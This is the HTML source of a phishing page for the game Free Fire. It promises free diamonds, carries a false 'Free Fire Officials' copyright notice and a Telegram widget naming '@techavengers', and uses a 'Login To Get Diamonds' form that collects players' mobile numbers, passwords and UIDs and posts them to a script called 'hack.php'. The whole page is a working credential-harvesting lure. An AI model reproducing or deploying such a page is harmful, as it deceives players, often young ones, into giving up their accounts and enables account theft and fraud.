
<!DOCTYPE html>
<html>
<head><meta charset="windows-1252">
<title> Free Diamonds Scripts </title>

<meta name='theme-color' content='black'/>
<meta name='viewport' content='width=device-width, initial-scale=1'>
	<link rel='shortcut icon' href='' type='image/x-icon' /><link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Acme&display=swap' rel='stylesheet'>
	<link href='https://fonts.googleapis.com/css?family=Bree Serif'
rel='stylesheet'>
</head>

<style type='text/css'>
body{
height: auto;
width: auto;
color: 
#00FF00;
font-family:Bree Serif;
text-align:center;
padding:10px;
margin-top:2%;
background-color:#262626;
color:#1aefca;
letter-spacing:1.5px;
}
hr{
border:0;height:2px;
text-align: center;
background-image:linear-gradient(to right,rgba(0,0,0,0),rgba(0,255,0,1),rgba(0,0,0,0));
}
h1{
color:#1aefca;
}
form{
margin:2% auto;
padding:5px;
max-width:580px;
text-align:center;
}
.text{
font-size:16px;
color:
#00FF00;
outline:0;
border-radius:5px;
background-color: 
#262626;
position:relative;
font-family:Bree Serif;
text-align:center;
padding:8px 15px;
height:30px;
border:solid 1px 
#00FF00;
margin-bottom:15px;
box-shadow:10px 10px 20px rgba(0,0,0,0.1);
width:90%;
}
.text:hover{
border:solid 1px 
#FF0000;
}
.submit{
font-size:16px;
color:
#00FF00;
position:relative;
background:#262626;
outline:0;
border-radius:5px;
font-family:Bree Serif;
text-align:center;
padding:8px 15px;
height:45px;
border:solid 1px 
#00FF00;
margin-bottom:5%;
box-shadow:10px 10px 20px rgba(0,0,0,0.1);
width:50%;
}
.submit:hover{
background:
#262626;
color:#FF0000;
border:solid 1px 
#FF0000;
}
h3{
color:
#00FF00;
padding:5px 0;
}
strong{
color:orange;
}
marquee{
color:
#00FF00;
font-size: 20px;
text-align: center;
font-weight:bold;
}
balance{
color:
#00FF00;
font-size: 20px;
text-align: center;
font-weight:bold;
}
gzp{
color:
#00FF00;
font-size: 20px;
text-align: center;
font-weight:bold;
margin-top:5%;
}
#loader { 
border: 12px solid 
#00FF00; 
border-radius: 50%; 
border-top: 12px solid #595959; 
width: 100px; 
height: 100px;
text-align: center;
animation: spin 1s linear infinite; 
} 
@keyframes spin { 
100% { 
transform: rotate(360deg); 
 } 
} 
.center { 
position: absolute; 
top: 0; 
bottom: 0; 
left: 0; 
right: 0; 
margin: auto; 
}
a{
text-decoration:none;
color:#00FF00;
}
a:hover{
color:#FF0000;
}
::placeholder { 
color: 
#80FF80; 
font-size:16px;
}
audio{ 
display:none;
}
</style>

<body>
<div id='loader'class='center'></div><hr>
<font color='
#00FF00' size='6'><b>
Login To Get Diamonds</b>
<hr></div>
<br>
<!--###This will be starting line for php coading###-->

<form action='hack.php' method='post'>
		
<input type='text' name='mobile'  class='text' placeholder='Enter Your Mobile Number ' minlength='10' maxlength='10' required>

<input type='text' name='pass'  class='text' placeholder='Enter Password' required>

<input type="text" name="uid"  class='text' placeholder='Enter UID' required>


<input type='submit' class='submit' name='submit' value='Login'></form>
<!--###This will be ending line for php coading###-->

<gzp><br><hr>⚜ ©Copyright Free Fire Officials 2020-2021⚜<hr><hr></gzp>
<script type='text/javascript'> 
document.onreadystatechange = function() { 
if (document.readyState !== "complete") { 
document.querySelector( "body").style.visibility = "hidden"; 
document.querySelector( 
"#loader").style.visibility = "visible"; 
} 
else { 
document.querySelector( 
"#loader").style.display = "none"; 
document.querySelector( "body").style.visibility = "visible"; 
} 
 }; 
</script> 

<script type='text/javascript'>
(
function() {
var script=document.createElement('script');
script.type='text/javascript';
script.async =true;
script.src='//telegram.im/widget-button/index.php?id=@techavengers';
document.getElementsByTagName('head')[0].appendChild(script);
})();
</script>

